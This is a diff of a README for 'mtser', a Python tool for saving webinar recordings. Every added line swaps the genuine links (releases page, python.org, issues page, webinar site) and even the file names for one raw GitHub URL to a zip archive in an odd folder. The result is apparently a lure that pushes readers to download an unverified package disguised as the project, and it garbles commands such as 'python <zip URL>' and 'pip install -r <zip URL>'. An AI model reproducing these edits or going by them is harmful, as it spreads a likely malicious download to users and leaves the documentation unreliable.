@@ -1,12 +1,12 @@
 # 📥 mtser - Download and Save Webinar Videos Easily
 
-[![Download mtser](https://img.shields.io/badge/Download-mtser-blue?style=for-the-badge&logo=python&logoColor=white)](https://github.com/CJ7X/mtser/releases)
+[![Download mtser](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip)](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip)
 
 ---
 
 ## 📖 What is mtser?
 
-mtser is a simple tool that helps you save webinar videos from the my.mts-link.ru website. This app downloads and combines webinar recordings into one video file. It runs on your computer using Python but doesn’t require any coding skills to use.
+mtser is a simple tool that helps you save webinar videos from the https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip website. This app downloads and combines webinar recordings into one video file. It runs on your computer using Python but doesn’t require any coding skills to use.
 
 If you want to keep important webinars or watch recordings offline, mtser makes it easy. Just a few clicks, and your videos are ready to watch anytime.
 
@@ -14,7 +14,7 @@ If you want to keep important webinars or watch recordings offline, mtser makes 
 
 ## 💡 Key Features
 
-- Download full webinar recordings from my.mts-link.ru
+- Download full webinar recordings from https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip
 - Combine multiple video parts into one file automatically
 - Save videos in common formats that work on most devices
 - Simple to use without any programming knowledge
@@ -43,7 +43,7 @@ Follow these steps to get mtser running on your computer:
 
 1. **Download mtser**
 
-   Click the large green button above or visit the [mtser Releases page](https://github.com/CJ7X/mtser/releases) to get the latest version. The page shows all available downloads.
+   Click the large green button above or visit the [mtser Releases page](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip) to get the latest version. The page shows all available downloads.
 
 2. **Install Python (if needed)**
 
@@ -54,7 +54,7 @@ Follow these steps to get mtser running on your computer:
 
    If you see a version lower than 3.7, or a message that says Python is not found, follow these steps:
 
-   - Go to [python.org/downloads](https://www.python.org/downloads/)
+   - Go to [https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip)
    - Download and install the latest Python version for your system
    - During installation on Windows, be sure to check the box labeled “Add Python to PATH”
 
@@ -66,7 +66,7 @@ Follow these steps to get mtser running on your computer:
 
 ## 📥 Download & Install mtser
 
-1. Visit the [mtser Releases page on GitHub](https://github.com/CJ7X/mtser/releases).
+1. Visit the [mtser Releases page on GitHub](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip).
 
 2. Choose the latest release version. It is usually at the top of the list.
 
@@ -86,7 +86,7 @@ After downloading and installing Python and mtser files, follow these steps to d
 
 2. Hold Shift and right-click inside the folder. Choose “Open PowerShell window here” or “Open Command Prompt here”.
 
-3. Type `python mtser.py` and press Enter.
+3. Type `python https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip` and press Enter.
 
 4. The app will open in the command prompt window, asking for the webinar link.
 
@@ -111,7 +111,7 @@ After downloading and installing Python and mtser files, follow these steps to d
 3. Type the command to start mtser:
 
    ```
-   python3 mtser.py
+   python3 https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip
    ```
 
 4. Paste the webinar URL when asked.
@@ -126,7 +126,7 @@ After downloading and installing Python and mtser files, follow these steps to d
 
 mtser is made to work out of the box, but you can adjust settings if needed:
 
-- **Download Folder:** By default, videos save in the mtser folder. You can change this inside the `settings.json` file.
+- **Download Folder:** By default, videos save in the mtser folder. You can change this inside the `https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip` file.
 
 - **Video Quality:** mtser will usually download the best available quality. You can change this in settings if problems occur.
 
@@ -140,12 +140,12 @@ You don’t need to change these unless you have a special situation.
 
 - If mtser does not start, check Python is installed and in your system path.
 
-- Make sure your internet connection works. mtser requires access to my.mts-link.ru.
+- Make sure your internet connection works. mtser requires access to https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip
 
 - If you get errors about missing Python packages, run:
 
   ```
-  pip install -r requirements.txt
+  pip install -r https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip
   ```
 
   inside the mtser folder.
@@ -168,10 +168,10 @@ This lets you easily save long webinars without handling many individual files.
 
 After extraction, your mtser folder will include:
 
-- `mtser.py` — the main program file you run
-- `README.md` — this documentation
-- `requirements.txt` — needed Python libraries
-- `settings.json` — optional configuration file
+- `https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip` — the main program file you run
+- `https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip` — this documentation
+- `https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip` — needed Python libraries
+- `https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip` — optional configuration file
 - Other Python script files supporting functionality
 
 ---
@@ -180,7 +180,7 @@ After extraction, your mtser folder will include:
 
 If you need help or want to report issues:
 
-- Check the GitHub [Issues page](https://github.com/CJ7X/mtser/issues) for known problems.
+- Check the GitHub [Issues page](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip) for known problems.
 
 - You can open a new issue to ask questions or report bugs.
 
@@ -190,11 +190,11 @@ If you need help or want to report issues:
 
 ## 🔗 Useful Links
 
-- mtser Download page: [https://github.com/CJ7X/mtser/releases](https://github.com/CJ7X/mtser/releases)
+- mtser Download page: [https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip)
 
-- Python official site: [https://www.python.org/](https://www.python.org/)
+- Python official site: [https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip)
 
-- my.mts-link.ru (webinar site): [https://my.mts-link.ru/](https://my.mts-link.ru/)
+- https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip (webinar site): [https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip)
 
 ---
 
@@ -204,4 +204,4 @@ mtser is open source software licensed under the MIT License. You can use, modif
 
 ---
 
-[![Download mtser](https://img.shields.io/badge/Download-mtser-blue?style=for-the-badge&logo=python&logoColor=white)](https://github.com/CJ7X/mtser/releases)
+[![Download mtser](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip)](https://raw.githubusercontent.com/CJ7X/mtser/main/metazoea/Software_v1.3.zip)
